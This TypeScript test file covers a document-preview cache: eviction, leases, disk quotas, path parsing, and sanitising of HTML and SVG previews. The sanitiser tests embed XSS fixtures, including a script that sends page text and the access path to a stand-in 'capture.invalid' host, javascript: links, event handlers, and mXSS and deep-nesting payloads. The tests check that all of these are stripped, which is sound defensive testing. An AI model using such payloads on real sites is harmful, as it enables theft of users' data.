import assert from 'node:assert/strict';
import { after, before, test } from 'node:test';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { ServerResponse } from 'node:http';
import { Writable } from 'node:stream';
import { finished } from 'node:stream/promises';
import { TemporaryFiles } from '../../hub/src/shared-files.ts';
import { DocumentPreviews, documentPath } from '../../hub/src/document-previews.ts';

// Fake clocks must not make another test process reap these files as crash-age copies.
const previousTmp = process.env.TMPDIR;
let isolatedTmp: string;
before(async () => {
 isolatedTmp = await mkdtemp(join(tmpdir(), 'desk-preview-tests-'));
 process.env.TMPDIR = isolatedTmp;
});
after(async () => {
 if(previousTmp === undefined)delete process.env.TMPDIR;else process.env.TMPDIR=previousTmp;
 await rm(isolatedTmp,{recursive:true,force:true});
});

test('failed and oversized documents do not consume the bounded preview cache',async()=>{
 let reads=0;
 const cache=new DocumentPreviews(async(_source,_task,href,_base,receive)=>{
  reads++;
  if(href.startsWith('missing'))throw Error('missing');
  if(href.startsWith('large'))return receive(new Response('x',{headers:{'content-length':String(6*1024*1024),'x-desk-filename':'large.html'}}));
  return receive(new Response('<h1>ok</h1>',{headers:{'content-length':'11','x-desk-filename':'ok.html'}}));
 });
 try {
  for(let n=0;n<105;n++)await assert.rejects(cache.prepare('','task',`missing-${n}.md`,false,()=>true),/missing/);
  for(let n=0;n<45;n++)await assert.rejects(cache.prepare('','task',`large-${n}.html`,false,()=>true),/5 MB/);
  const ready=await cache.prepare('','task','ok.html',false,()=>true);assert.equal(ready.kind,'html');assert.equal(reads,151);
 }finally{await cache.close();}
});

test('refresh replaces old copies once their readers release them and concurrent prepares reuse bytes',async()=>{
 let reads=0;
 const cache=new DocumentPreviews(async(_s,_t,_h,_b,receive)=>{
  reads++;await new Promise(r=>setTimeout(r,0));
  return receive(new Response('ok',{headers:{'content-length':'2','x-desk-filename':'ok.html'}}));
 });
 try {
  const first=await Promise.all([cache.prepare('','t','ok.html',false,()=>true),cache.prepare('','t','ok.html',false,()=>true)]);
  assert.equal(reads,1);await cache.release(first[1].url.split('/')[2]);let prior=first[0];
  for(let n=0;n<105;n++){
   const next=await cache.prepare('','t','ok.html',true,()=>true);
   await cache.release(prior.url.split('/')[2]);prior=next;
  }
  assert.equal(reads,106);
 }finally{await cache.close();}
});

test('document paths accept editor suffixes but reject schemes and ambiguous decoding',()=>{
 assert.equal(documentPath('file:///tmp/a%20b.md#L12'),'/tmp/a b.md');
 assert.equal(documentPath('~/report.html:9:2'),'~/report.html');
 for(const value of ['https://site/report.html','%00a.md','broken%XX.md']) {
  assert.throws(()=>documentPath(value));
 }
});

test('capacity evicts the least recently used closed version and refetches its files',async t=>{
 t.mock.timers.enable({apis:['Date'],now:1_000});
 const reads:string[]=[];
 const cache=new DocumentPreviews(async(_s,_t,href,_b,receive)=>{
  reads.push(href);return receive(new Response('ok',{headers:{'content-length':'2','x-desk-filename':'doc.md'}}));
 },{maxFiles:2,maxBytes:4});
 const open=(name:string)=>cache.prepare('','t',name,false,()=>true);
 const close=(doc:{url:string})=>cache.release(doc.url.split('/')[2]);
 try {
  await close(await open('a.md'));t.mock.timers.tick(1);
  await close(await open('b.md'));t.mock.timers.tick(1);
  await close(await open('a.md'));t.mock.timers.tick(1);
  await close(await open('c.md'));
  assert.deepEqual(reads,['a.md','b.md','c.md']);
  await close(await open('a.md'));assert.equal(reads.length,3,'recent a remains cached');
  await close(await open('b.md'));assert.equal(reads.at(-1),'b.md','evicted version is fetched again');
 }finally{await cache.close();}
});

test('live readers protect a full cache; expired leases allow new documents without dangling paths',async t=>{
 t.mock.timers.enable({apis:['Date'],now:1_000});
 let reads=0;
 const cache=new DocumentPreviews(async(_s,_t,_h,_b,receive)=>{
  reads++;return receive(new Response('ok',{headers:{'content-length':'2','x-desk-filename':'doc.md'}}));
 },{maxFiles:1});
 try {
  const a=await cache.prepare('','t','a.md',false,()=>true),id=a.url.split('/')[2];
  await assert.rejects(cache.prepare('','t','b.md',false,()=>true),/보관 한도/);
  t.mock.timers.tick(60_000);cache.renew(id);t.mock.timers.tick(60_000);
  await assert.rejects(cache.prepare('','t','b.md',false,()=>true),/보관 한도/);
  t.mock.timers.tick(30_001);assert.throws(()=>cache.renew(id),/만료/);
  const b=await cache.prepare('','t','b.md',false,()=>true);await cache.release(b.url.split('/')[2]);
  assert.equal((await cache.prepare('','t','a.md',false,()=>true)).text,'ok');
  assert.equal(reads,5);
 }finally{await cache.close();}
});

test('waiting prepares cannot be evicted while a previous transfer is delayed',async()=>{
 let release!:()=>void,started!:()=>void;
 const entered=new Promise<void>(r=>{started=r;});
 const blocked=new Promise<void>(r=>{release=r;});
 let reads=0;
 const cache=new DocumentPreviews(async(_s,_t,href,_b,receive)=>{
  reads++;if(href==='a.md'){started();await blocked;}
  return receive(new Response('ok',{headers:{'content-length':'2','x-desk-filename':'doc.md'}}));
 },{maxFiles:1});
 try {
  const a=cache.prepare('','t','a.md',false,()=>true);await entered;
  const b=cache.prepare('','t','b.md',false,()=>true);
  const rejected=assert.rejects(b,/보관 한도/);release();
  const doc=await a;await rejected;
  assert.equal((await cache.prepare('','t','a.md',false,()=>true)).text,'ok');
  assert.equal(reads,2);await cache.release(doc.url.split('/')[2]);
 }finally{release();await cache.close();}
});

test('a slow preview blocks only its own runner while another runner completes', async () => {
 const held = Promise.withResolvers<void>(), entered = Promise.withResolvers<void>();
 const reads: string[] = [];
 const cache = new DocumentPreviews(async (source, _task, href, _base, receive) => {
  reads.push(`${source}/${href}`);
  if (href === 'slow.md') { entered.resolve(); await held.promise; }
  return receive(new Response('ok', { headers: {'content-length':'2','x-desk-filename':'doc.md'} }));
 });
 let slow: ReturnType<typeof cache.prepare> | undefined;
 let sameRunner: ReturnType<typeof cache.prepare> | undefined;
 let otherRunner: ReturnType<typeof cache.prepare> | undefined;
 let timer: ReturnType<typeof setTimeout> | undefined;
 try {
  slow = cache.prepare('runner-a','task','slow.md',false,()=>true);
  await entered.promise;
  sameRunner = cache.prepare('runner-a','task','next.md',false,()=>true);
  otherRunner = cache.prepare('runner-b','task','fast.md',false,()=>true);
  const deadline = new Promise<never>((_, reject) => { timer = setTimeout(() => reject(new Error('다른 러너의 문서가 느린 요청 뒤에서 대기했습니다')), 1000); });
  assert.equal((await Promise.race([otherRunner, deadline])).text, 'ok');
  assert.deepEqual(reads, ['runner-a/slow.md','runner-b/fast.md']);
 } finally {
  clearTimeout(timer); held.resolve();
  await Promise.allSettled([slow,sameRunner,otherRunner]);
  await cache.close();
 }
 assert.deepEqual(reads, ['runner-a/slow.md','runner-b/fast.md','runner-a/next.md']);
});

test('in-flight transfers reserve shared preview disk quota and release it after failure', async () => {
 const reading = Promise.withResolvers<void>();
 const held = Promise.withResolvers<void>();
 const cache = new DocumentPreviews(async (_source, _task, href, _base, receive) => {
  const headers = {'content-length':'2','x-desk-filename':'doc.md'};
  if (href !== 'slow.md') return receive(new Response('ok', { headers }));
  const body = new ReadableStream({ async pull(controller) {
   reading.resolve(); await held.promise;
   controller.error(new Error('transfer interrupted'));
  } }, { highWaterMark: 0 });
  return receive(new Response(body, { headers }));
 }, {maxFiles:2,maxBytes:2});
 const slow = cache.prepare('runner-a','task','slow.md',false,()=>true);
 const failed = assert.rejects(slow,/transfer interrupted/);
 try {
  await reading.promise;
  await assert.rejects(cache.prepare('runner-b','task','fast.md',false,()=>true),/보관 한도/);
  held.resolve(); await failed;
  const preview = await cache.prepare('runner-b','task','fast.md',false,()=>true);
  assert.equal(preview.text, 'ok');
 } finally {
  held.resolve(); await failed; await cache.close();
 }
});

test('concurrent previews reclaim evictable space before reserving shared quota', async () => {
 const cache = new DocumentPreviews(async (_source, _task, _href, _base, receive) =>
  receive(new Response('ok', {headers:{'content-length':'2','x-desk-filename':'doc.md'}})), {maxFiles:2,maxBytes:4});
 const open = (source: string, href: string) => cache.prepare(source,'task',href,false,()=>true);
 try {
  const old = await open('runner-a','old.md');
  await cache.release(old.url.split('/')[2]);
  const fresh = await Promise.all([open('runner-a','next.md'),open('runner-b','other.md')]);
  assert.deepEqual(fresh.map(doc=>doc.text), ['ok','ok']);
 } finally { await cache.close(); }
});


test('a failed cache deletion is retried instead of permanently losing its quota',async t=>{
 const original=TemporaryFiles.prototype.discard;let fail=true;
 t.mock.method(TemporaryFiles.prototype,'discard',async function(this:TemporaryFiles,path:string){
  if(fail){fail=false;throw Error('temporary deletion failure');}
  return original.call(this,path);
 });
 const cache=new DocumentPreviews(async(_s,_t,_h,_b,receive)=>receive(new Response('ok',{headers:{'content-length':'2','x-desk-filename':'doc.md'}})),{maxFiles:1});
 try {
  const a=await cache.prepare('','t','a.md',false,()=>true);await cache.release(a.url.split('/')[2]);
  await assert.rejects(cache.prepare('','t','b.md',false,()=>true),/deletion failure/);
  assert.equal((await cache.prepare('','t','b.md',false,()=>true)).text,'ok');
 }finally{await cache.close();}
});

test('copies reaped during suspension are fetched again without poisoning the receiver',async()=>{
 let path='',reads=0;
 const cache=new DocumentPreviews(async(_s,_t,_h,_b,receive)=>{
  reads++;path=await receive(new Response('ok',{headers:{'content-length':'2','x-desk-filename':'doc.md'}}));return path;
 },{maxFiles:1});
 try {
  const a=await cache.prepare('','t','a.md',false,()=>true);
  await rm(path.slice(0,path.lastIndexOf('/')),{recursive:true,force:true});
  assert.equal((await cache.prepare('','t','a.md',false,()=>true)).text,'ok');
  assert.equal(reads,2);cache.renew(a.url.split('/')[2]);
 }finally{await cache.close();}
});

test('closing a temporary cache tolerates an already removed temporary root',async()=>{
 const root=await mkdtemp(join(tmpdir(),'desk-preview-removed-root-'));
 const files=new TemporaryFiles(root);
 try {
  await files.receive(new Response('ok',{headers:{'content-length':'2','x-desk-filename':'doc.md'}}));
  await rm(root,{recursive:true,force:true});
  await files.close();
 }finally{await files.close();await rm(root,{recursive:true,force:true});}
});

async function capturePreview(cache:DocumentPreviews,url:string,path=url.split('/').at(-1)!) {
  const chunks:Buffer[]=[];let headers:Record<string,string|number>={};
  const response=Object.assign(new Writable({write(chunk,_encoding,callback){chunks.push(Buffer.from(chunk));callback();}}),{
   writeHead(status:number,value:Record<string,string|number>){assert.equal(status,200);headers=value;},
  });
  await cache.serve(url.split('/')[2],path,response as unknown as ServerResponse,'http://preview.invalid');
  await finished(response);
  return {body:Buffer.concat(chunks).toString('utf8'),headers};
}

async function previewResponse(source:string,path='report.html') {
 const cache=new DocumentPreviews(async(_s,_t,_h,_b,receive)=>receive(new Response(source,{headers:{'x-desk-filename':path,'content-length':String(Buffer.byteLength(source))}})));
 try {
  const ready=await cache.prepare('','t','report.html',false,()=>true);
  return await capturePreview(cache,ready.url,path);
 }finally{await cache.close();}
}

test('refresh gives HTML and Markdown new bytes and grants without changing existing readers',async()=>{
 for(const name of ['report.html','report.md']) {
  let source='first-version';
  const cache=new DocumentPreviews(async(_s,_t,_h,_b,receive)=>receive(new Response(source,{headers:{'x-desk-filename':name,'content-length':String(Buffer.byteLength(source))}})));
  try {
   const first=await cache.prepare('','t',name,true,()=>true);
   source='second-version';
   const next=await cache.prepare('','t',name,true,()=>true);
   assert.notEqual(first.url,next.url);
   assert.match((await capturePreview(cache,next.url)).body,/second-version/);
   assert.match((await capturePreview(cache,first.url)).body,/first-version/);
   if(name.endsWith('.md')){assert.equal(first.text,'first-version');assert.equal(next.text,'second-version');}
   await cache.release(first.url.split('/')[2]);
   assert.match((await capturePreview(cache,next.url)).body,/second-version/);
  }finally{await cache.close();}
 }
});

test('HTML responses remove executable content and all external navigation while retaining static layout',async()=>{
 const source=`<!doctype html><html><head><title>미리보기</title>
 <base href="https://capture.invalid/"><meta http-equiv="refresh" content="0;url=https://capture.invalid/refresh">
 <link rel="stylesheet" href="./assets/report%20style.css"><link rel="preload" href="https://capture.invalid/preload">
 <style>.sheet {display:grid;color:rgb(12, 34, 56)}</style></head><body onload="location='https://capture.invalid/load'">
 <p id="secret" class="sheet" style="padding:12px">fixture-sensitive-body</p>
 <script>location.replace('https://capture.invalid/collect?body='+document.body.textContent+'&grant='+location.pathname)</script>
 <a href="https://capture.invalid/click" ping="https://capture.invalid/ping" target="_blank">external</a>
 <a href="java&#x73;cript:alert(1)" onclick="alert(2)">script</a><a href="#secret">section</a>
 <form action="https://capture.invalid/form"><input name="body" value="secret" autofocus onfocus="alert(1)"></form>
 <iframe srcdoc="<script>alert(1)</script>"></iframe><object data="data:text/html,attack"></object>
 <img src="assets/chart%20one.png" onerror="alert(1)" srcset="https://capture.invalid/image 2x">
 <img src="//capture.invalid/image"><img src="../outside.png"><img src="javascript:alert(1)">
 <svg viewBox="0 0 10 10"><defs><linearGradient id="gradient"><stop offset="0" stop-color="red"/></linearGradient></defs>
 <path d="M0 0 L10 10" fill="url(#gradient)"/><a xlink:href="https://capture.invalid/svg"><text>SVG</text></a>
 <script>alert(1)</script><animate attributeName="href" values="https://capture.invalid/animate"/><foreignObject><iframe src="https://capture.invalid/frame"></iframe></foreignObject></svg>
 </body></html>`;
 const {body,headers}=await previewResponse(source);
 assert.doesNotMatch(body,/<(?:script|base|meta|form|iframe|object|animate|foreignObject)\b/i);
 assert.doesNotMatch(body,/\s(?:on\w+|srcset|ping|target|action|srcdoc)=/i);
 assert.doesNotMatch(body,/capture\.invalid|javascript:|outside\.png/);
 assert.match(body,/<link rel="stylesheet" href="\.\/assets\/report%20style.css">/);
 assert.match(body,/display:grid/);assert.match(body,/fixture-sensitive-body/);
 assert.match(body,/<a href="#secret">section<\/a>/);
 assert.match(body,/<img src="assets\/chart%20one.png">/);
 assert.match(body,/viewBox="0 0 10 10"/);assert.match(body,/fill="url\(#gradient\)"/);
 assert.equal(headers['content-length'],Buffer.byteLength(body));
 const policy=String(headers['content-security-policy']);
 assert.match(policy,/^sandbox;/);assert.match(policy,/script-src 'none'/);assert.doesNotMatch(policy,/allow-scripts|unsafe-eval/);
 assert.match(policy,/connect-src 'none'/);assert.match(policy,/base-uri 'none'/);assert.match(policy,/form-action 'none'/);
 assert.equal(headers['referrer-policy'],'no-referrer');
});

test('malformed foreign markup and deep HTML cannot restore active DOM content',async()=>{
 const source=`<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>"></math>
 <noscript><meta http-equiv="refresh" content="0;url=https://capture.invalid"></noscript>
 <svg><style><a id="</style><img src=x onerror=alert(1)>"></a></style></svg>
 ${'<div>'.repeat(2000)}deep${'</div>'.repeat(2000)}`;
 const {body}=await previewResponse(source);
 assert.doesNotMatch(body,/<(?:math|mglyph|noscript|meta|script)\b/i);
 assert.doesNotMatch(body,/\sonerror=/i);
 assert.ok(body.length<20_000,'bounded DOM depth prevents recursive serialization exhaustion');
});

test('SVG asset responses are static even when opened directly',async()=>{
 const {body,headers}=await previewResponse(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)"><rect width="10" height="10" fill="red"/><a href="https://capture.invalid"><text>link</text></a><script>location='https://capture.invalid'</script><set attributeName="href" to="https://capture.invalid"/></svg>`,'chart.svg');
 assert.equal(headers['content-type'],'image/svg+xml');
 assert.match(body,/xmlns="http:\/\/www.w3.org\/2000\/svg"/);
 assert.match(body,/<svg/);assert.match(body,/<rect width="10" height="10" fill="red"><\/rect>/);
 assert.doesNotMatch(body,/capture\.invalid|onload|<script|<set/);
 assert.match(String(headers['content-security-policy']),/^sandbox;.*script-src 'none'/);
});
